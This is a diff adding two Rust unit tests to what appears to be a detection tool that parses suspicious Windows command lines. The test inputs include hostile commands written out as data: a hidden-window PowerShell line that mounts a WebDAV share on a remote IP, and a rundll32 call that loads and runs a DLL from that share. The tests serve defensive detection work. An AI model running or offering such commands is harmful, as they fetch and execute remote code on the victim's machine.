@@ -9937,6 +9937,26 @@ rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"#,
     }
 
     #[test]
+    fn rundll32_webdav_dll_argument_resolves_http_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"rundll32 \\45.9.74.32@8888\davwwwroot\596.dll,entry"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { url: Some(url), .. }
+                        if url == "http://45.9.74.32:8888/596.dll"
+                )
+            }),
+            "rundll32 WebDAV DLL source URL was not resolved: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn copy_system32_tracked() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -17478,6 +17498,26 @@ rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/pay
             }),
             "spaced rundll32 downloaded DLL was not typed: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_webdav_dll_in_deob_text_resolves_http_url() {
+        let report = crate::analyze(
+            br#"start powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\  rundll32 \\45.9.74.32@8888\davwwwroot\596.dll,entry"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { cmd, url: Some(url) }
+                        if cmd.contains(r#"rundll32 \\45.9.74.32@8888\davwwwroot\596.dll,entry"#)
+                            && url == "http://45.9.74.32:8888/596.dll"
+                )
+            }),
+            "rundll32 WebDAV DLL in deob text was not typed: {:?}",
+            report.traits
         );
     }
 
